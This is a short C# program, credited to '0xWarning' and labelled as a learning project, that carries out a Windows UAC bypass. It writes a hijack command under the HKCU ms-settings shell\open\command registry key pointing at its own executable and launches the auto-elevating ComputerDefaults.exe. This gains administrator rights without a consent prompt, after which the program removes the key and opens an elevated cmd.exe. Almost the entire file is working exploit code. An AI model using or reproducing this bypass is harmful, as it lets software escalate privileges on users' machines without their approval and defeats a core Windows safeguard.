/*
 
 Author - 0xWarning
 Github - @0xWarning / https://github.com/0xWarning
 Project - Uac Bypass
 Completed - 06/11/2018 
 Summary - Simple application for people to learn off
 */

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Security.Principal;

namespace UAC_Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            if (Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\shell\open\command") == null)
                ElevateMe();
            else
                Registry.CurrentUser.DeleteSubKey(@"Software\Classes\ms-settings\shell\open\command");
            if (!IsElevated())
                Environment.Exit(0);



            Console.Write("Check For Elevation [Y][N] ");

            HandleResponse(Console.ReadKey());


            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.Verb = "runas";
            process.Start();

        }
        private static bool IsElevated()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
        private static void ElevateMe()
        {
            try
            {
                CreateKey(string.Empty, Assembly.GetEntryAssembly().Location);
                CreateKey("DelegateExecute", string.Empty);
                Process.Start(@"C:\Windows\System32\ComputerDefaults.exe");
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error\n" + ex.Message);
                Console.ReadLine();
            }
            void CreateKey(string name, string val)
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
                key.SetValue(name, val);
                key.Close();
            }
        }
        private static void HandleResponse(ConsoleKeyInfo resp)
        {
            if (!resp.KeyChar.Equals('y'))
                Environment.Exit(0);
        }
    }
}
